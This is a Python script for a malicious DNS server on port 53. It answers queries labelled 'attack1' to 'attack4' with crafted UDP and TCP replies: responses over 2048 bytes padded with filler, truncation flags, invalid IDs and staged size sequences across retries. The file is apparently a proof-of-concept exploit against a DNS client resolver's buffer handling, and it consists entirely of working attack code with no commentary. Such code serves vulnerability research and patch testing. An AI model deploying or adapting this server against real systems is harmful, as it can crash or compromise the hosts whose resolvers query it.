#!/usr/bin/env python3

import socket
import struct
import threading
import time
import sys

from dnsutil import DNSParser, DNSMessage, DNSHeader, DNSQuestion, DNSRR, DNSFlags

HOST=""
PORT=53


def dw(v):
    return struct.pack("!H", v)

def dd(v):
    return struct.pack("!L", v)

def log(*args):
    print(*args)
    sys.stdout.flush()


def truncated_over2k(request):
    """Sends a reply > 2048 bytes with valid header/question and TC flag set"""
    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA", "TC"])

    question = request.questions[0]

    header = DNSHeader(request.header.ID, flags, 1, 0, 0, 0)
    return header.bytes() + question.bytes() + b"\x42" * 2048


def valid_over2k(request):
    """Sends a reply > 2048 bytes with valid header/question"""
    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA"])

    question = request.questions[0]

    header = DNSHeader(request.header.ID, flags, 1, 0, 0, 0)
    return header.bytes() + question.bytes() + b"\x42" * 2048


def truncated_over1k(request):
    """Sends a reply > 1024 bytes (but less than 2048 bytes) with valid header/question and TC flag set"""
    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA", "TC"])

    question = request.questions[0]

    header = DNSHeader(request.header.ID, flags, 1, 0, 0, 0)
    return header.bytes() + question.bytes() + b"\x42" * 1024


def valid_exact2k(request):
    """Sends a reply exactly 2048 bytes long with valid header/question"""
    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA"])

    question = request.questions[0]

    header = DNSHeader(request.header.ID, flags, 1, 0, 0, 0)
    padlen = 2048 - len(header.bytes()) - len(question.bytes())
    return header.bytes() + question.bytes() + b"\x42" * padlen


def valid_exact1k(request):
    """Sends a reply exactly 1024 bytes long with valid header/question"""
    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA"])

    question = request.questions[0]

    header = DNSHeader(request.header.ID, flags, 1, 0, 0, 0)
    padlen = 1024 - len(header.bytes()) - len(question.bytes())
    return header.bytes() + question.bytes() + b"\x42" * padlen


def invalid_over2k(request):
    """Sends a reply > 2048 bytes with invalid ID"""
    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA"])

    question = request.questions[0]

    header = DNSHeader(0x0000, flags, 1, 0, 0, 0)
    return header.bytes() + question.bytes() + b"\x42" * 2048


def udp_server():
    """UDP request handler"""

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, PORT))

    attack2_state = {}
    attack3_state = {}
    attack4_state = {}

    while True:
        data, addr = sock.recvfrom(1024)
        log("[UDP] Datagram from {}:{}".format(*addr))

        # Parse DNS request
        try:
            tmp, request = DNSParser.parse_message(data)
            log("[UDP] {} bytes in: {}".format(len(data), request.header))
        except Exception as e:
            log("DNSParser error: {}".format(e))
            continue

        # Ensure we have a valid question
        if not request.questions or not request.questions[0].labels:
            continue

        # Execute selected attack
        attack = request.questions[0].labels[0].decode("ascii")
        if attack == "attack1":
            if request.questions[0].qtype == 1:
                log("[attack1] Sending truncated UDP reply to {}:{}".format(*addr))
                data = truncated_over2k(request)
                sock.sendto(data, addr)
        elif attack == "attack2":
            state = attack2_state.get(addr[0], 0)
            if state == 0:
                log("[attack2] Sending invalid reply to first UDP request from {}:{}".format(*addr))
                data = invalid_over2k(request)
                sock.sendto(data, addr)
                attack2_state[addr[0]] = 1
            if state == 1:
                log("[attack2] Ignoring second UDP request from {}:{}".format(*addr))
                attack2_state[addr[0]] = 2
            if state == 2:
                log("[attack2] Sending UDP reply to first retry request from {}:{}".format(*addr))
                data = valid_over2k(request)
                sock.sendto(data, addr)
                attack2_state[addr[0]] = 3
            if state == 3:
                log("[attack2] Sending UDP reply to second retry request from {}:{}".format(*addr))
                data = valid_over2k(request)
                sock.sendto(data, addr)
                attack2_state.pop(addr[0], None)
        elif attack == "attack3":
            state = attack3_state.get(addr[0], 0)
            if state == 0:
                log("[attack3] Sending 1024-byte reply to first UDP request from {}:{}".format(*addr))
                data = valid_exact1k(request)
                sock.sendto(data, addr)
                attack3_state[addr[0]] = 1
            if state == 1:
                log("[attack3] Sending truncated > 1024-byte reply to second UDP request from {}:{}".format(*addr))
                data = truncated_over1k(request)
                sock.sendto(data, addr)
                attack3_state.pop(addr[0], None)
        elif attack == "attack4":
            state = attack4_state.get(addr[0], 0)
            if state == 0:
                log("[attack4] Sending 2048-byte reply to first UDP request from {}:{}".format(*addr))
                data = valid_exact2k(request)
                sock.sendto(data, addr)
                attack4_state[addr[0]] = 1
            if state == 1:
                log("[attack4] Sending 1024-byte reply to second UDP request from {}:{}".format(*addr))
                data = valid_exact1k(request)
                sock.sendto(data, addr)
                attack4_state[addr[0]] = 2
            if state == 2:
                log("[attack4] Sending UDP reply to first retry request from {}:{}".format(*addr))
                data = valid_over2k(request)
                sock.sendto(data, addr)
                attack4_state[addr[0]] = 3
            if state == 3:
                log("[attack4] Sending UDP reply to second retry request from {}:{}".format(*addr))
                data = valid_over2k(request)
                sock.sendto(data, addr)
                attack4_state.pop(addr[0], None)


def tcp_server():
    """TCP request handler"""

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, PORT))
    sock.listen(10)

    while True:
        conn, addr = sock.accept()
        log("[TCP] Connection from {}:{}".format(*addr))

        while True:
            # Read message length
            try:
                msglen = struct.unpack("!H", conn.recv(2))[0]
                data = conn.recv(msglen)
            except:
                log("[TCP] Disconnected from {}:{}".format(*addr))
                break

            # Parse DNS request header
            tmp, request = DNSParser.parse_message(data)
            log("[TCP] {} bytes in: {}".format(len(data), request.header))

            if not request.questions or not request.questions[0].labels:
                continue

            # Execute selected attack
            attack = request.questions[0].labels[0].decode("ascii")
            if attack == "attack1":
                log("[attack1] Sending > 2048-byte TCP reply to {}:{}".format(*addr))
                data = valid_over2k(request)
                conn.sendall(dw(len(data)) + data)
            if attack == "attack3":
                log("[attack3] Sending > 2048-byte TCP reply to {}:{}".format(*addr))
                data = valid_over2k(request)
                conn.sendall(dw(len(data)) + data)


if __name__ == "__main__":

    if len(sys.argv) > 1:
        HOST = sys.argv[1]

    if len(sys.argv) > 2:
        PORT = sys.argv[2]
        
    udp_thread = None
    tcp_thread = None

    while True:
        if not udp_thread or not udp_thread.is_alive():
            log("Starting UDP server...")
            udp_thread = threading.Thread(target=udp_server)
            udp_thread.daemon = True
            udp_thread.start()

        if not tcp_thread or not tcp_thread.is_alive():
            log("Starting TCP server...")
            tcp_thread = threading.Thread(target=tcp_server)
            tcp_thread.daemon = True
            tcp_thread.start()

        time.sleep(5)

